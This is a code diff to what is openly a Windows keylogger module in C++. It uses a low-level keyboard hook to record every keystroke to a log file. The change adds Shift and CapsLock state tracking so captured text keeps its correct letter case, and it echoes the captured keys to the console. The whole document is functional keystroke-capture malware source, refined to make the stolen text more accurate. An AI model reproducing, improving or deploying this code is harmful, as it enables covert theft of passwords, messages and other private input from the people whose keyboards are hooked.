@@ -2,16 +2,14 @@
 
 #define KB_ENV L"RCDO_NOTIFY" // name of environment variable to search for
 
+// store a list of modifier that is left untracked because their inputs are reflected in the keylog through change in regular keys
+
 // map to track keystrokes that cannot be mapped with MapVirtualKeyExW
 std::map<int, std::wstring> mapSpecialKeys = {
     {VK_BACK, L"[BACKSPACE]"},
     {VK_RETURN, L"[ENTER]"},
     {VK_SPACE, L"_"},
     {VK_TAB, L"[TAB]"},
-    {VK_SHIFT, L"[SHIFT]"},
-    {VK_LSHIFT, L"[SHIFT]"},
-    {VK_RSHIFT, L"[SHIFT]"},
-    {VK_CAPITAL, L"[CAPSLOCK]"},
     {VK_CONTROL, L"[CONTROL]"},
     {VK_LCONTROL, L"[CONTROL]"},
     {VK_RCONTROL, L"[CONTROL]"},
@@ -58,6 +56,19 @@ HHOOK ghHook;
 KBDLLHOOKSTRUCT kbdStruct;
 std::wofstream logFile;
 std::mutex logFileMutex;
+
+// stores booleans for letter casing
+// caseStatus.first is the SHIFT key status
+// caseStatus.second is the CapsLock key status
+// +-------+------+------+
+// | SHIFT | CAPS | CASE |
+// +-------+------+------+
+// |     0 |    0 |    0 |
+// |     0 |    1 |    1 |
+// |     1 |    0 |    1 |
+// |     1 |    1 |    0 |
+// +-------+------+------+
+std::pair<bool, bool> caseStatus = std::make_pair<bool, bool>(0, 0);
 
 int KeyboardMod::requireAdmin(){
     return 0;
@@ -182,10 +193,12 @@ void logKeystroke(int vkCode){
     else{
         HKL kbLayout = GetKeyboardLayout(GetCurrentProcessId());
 
-        // always lowercase because SHIFT before it will reflect the case
-        wchar_t key = tolower(MapVirtualKeyExW(vkCode, MAPVK_VK_TO_CHAR, kbLayout));
+        wchar_t key = MapVirtualKeyExW(vkCode, MAPVK_VK_TO_CHAR, kbLayout);
+        key = (caseStatus.first ^ caseStatus.second) ? key : tolower(key);
 
         output << key;
+
+        std::wcout << output.str() << std::endl;
     }
 
     logFileMutex.lock();
@@ -198,10 +211,29 @@ LRESULT __stdcall hookCallback(int nCode, WPARAM wParam, LPARAM lParam){
     // function handler for all keyboard strokes
 
     if (nCode >= 0){
-        if (wParam == WM_KEYDOWN){
-            kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
 
-            logKeystroke(kbdStruct.vkCode);
+        kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
+        int vkCode = kbdStruct.vkCode;
+
+        if (wParam == WM_KEYDOWN){
+            if (vkCode == VK_SHIFT || vkCode == VK_LSHIFT || vkCode == VK_RSHIFT){
+                caseStatus.first = 1;
+                return 1;
+            }
+
+            logKeystroke(vkCode);
+        }
+
+        if (wParam == WM_KEYUP){
+            if (vkCode == VK_SHIFT || vkCode == VK_LSHIFT || vkCode == VK_RSHIFT){
+                caseStatus.first = 0;
+                return 1;
+            }
+
+            if (vkCode == VK_CAPITAL){
+                caseStatus.second = !caseStatus.second;
+                return 1;
+            }
         }
     }
 
